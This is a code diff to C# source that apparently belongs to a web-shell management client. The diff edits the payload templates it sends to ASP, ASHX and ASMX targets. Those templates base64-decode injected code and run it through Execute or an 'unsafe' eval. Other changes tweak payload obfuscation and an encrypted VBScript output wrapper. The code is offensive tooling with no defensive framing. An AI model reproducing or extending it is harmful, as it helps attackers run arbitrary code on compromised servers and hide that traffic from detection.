@@ -205,7 +205,7 @@ namespace Alien
             {
                 enLanguage.ASP, (type) =>
                 {
-                    return @"Execute(""On Error Resume Next:Function d(s):Set x=CreateObject(""""MSXML2.DOMDocument""""):Set e=x.createElement(""""t""""):e.dataType=""""bin.base64"""":e.text=s:Set st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write e.nodeTypedValue:st.Position=0:st.Type=2:st.CharSet=""""utf-8"""":d=st.ReadText:End Function:Execute(d(""""[PATTERN]"""")):Response.End"")";
+                    return @"Execute(""On Error Resume Next:Function d(s):Set x=CreateObject(""""MSXML2.DOMDocument""""):Set e=x.createElement(""""t""""):e.dataType=""""bin.base64"""":e.text=s:Set st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write e.nodeTypedValue:st.Position=0:st.Type=2:st.CharSet=""""utf-8"""":d=st.ReadText:End Function:Execute(d(""""[PATTERN]""""))"")";
                 }
             },
             {
@@ -223,7 +223,7 @@ namespace Alien
                 enLanguage.ASHX, (type) =>
                 {
                     if (type == "JScript")
-                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}Response.End();";
+                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}";
                     else if (type == "CSharp")
                         return string.Empty;
 
@@ -234,7 +234,7 @@ namespace Alien
                 enLanguage.ASMX, (type) =>
                 {
                     if (type == "JScript")
-                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}Response.End();";
+                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}";
                     else if (type == "CSharp")
                         return string.Empty;
 
@@ -916,7 +916,7 @@ namespace Alien
                 if (config.bEHEnable)
                     szPayload = await m_tamper.fnObfuscate(config.szEventHorizonScript, szPayload, JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig));
 
-                if (!string.IsNullOrEmpty(config.szExtraPost))
+                if (!string.IsNullOrEmpty(config.szExtraPost) && !config.bEHEnable)
                 {
                     if (config.nExtraPostPosition == 0)
                         szPayload = config.szExtraPost + "&" + szPayload;
@@ -1326,8 +1326,8 @@ namespace Alien
         private static string fnWrapVBScript(string szOriginalPayload, string szEncryptor)
         {
             string szProcessed = szOriginalPayload;
-            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "Echo", RegexOptions.IgnoreCase);
-            szProcessed = Regex.Replace(szProcessed, @"\becho\b", "Echo", RegexOptions.IgnoreCase);
+            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "globalStringOutput = globalStringOutput & ", RegexOptions.IgnoreCase);
+            szProcessed = Regex.Replace(szProcessed, @"\becho\b", "globalStringOutput = globalStringOutput & ", RegexOptions.IgnoreCase);
 
             if (szEncryptor == "*")
                 return szProcessed;
@@ -1335,15 +1335,8 @@ namespace Alien
             string szHeader =
                 "\r\n" +
                 "Dim globalStringOutput\r\n" +
-                "Sub Echo(s)\r\n" +
-                "    globalStringOutput = globalStringOutput & s\r\n" +
-                "End Sub\r\n\r\n" +
-
-                (string.IsNullOrEmpty(szEncryptor) ?
-                "Function Encrypt(s)\r\n" +
-                "    ' TODO: Add VBScript encryption logic here\r\n" +
-                "    Encrypt = s\r\n" +
-                "End Function" : szEncryptor) + "\r\n\r\n";
+                "globalStringOutput = \"\"\r\n\r\n" +
+                (string.IsNullOrEmpty(szEncryptor) ? "" : szEncryptor) + "\r\n\r\n";
 
             string szFooter = "\r\n\r\nResponse.Write(Encrypt(globalStringOutput))\r\n";
 
